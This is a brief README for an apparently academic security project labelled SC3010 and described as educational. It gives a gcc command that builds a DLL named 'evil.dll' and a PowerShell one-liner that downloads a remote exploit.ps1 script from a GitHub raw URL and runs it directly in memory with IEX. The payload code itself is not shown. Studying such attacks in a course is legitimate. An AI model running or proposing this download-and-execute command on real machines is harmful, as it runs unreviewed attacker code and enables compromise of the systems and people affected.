# SC3010 Project

The following codes are educational. 

To create DLL files 

`gcc -shared -o evil.dll dll.c`


To run exploit

```
IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/Pwspang/SC3010-Codes/main/exploit.ps1');
```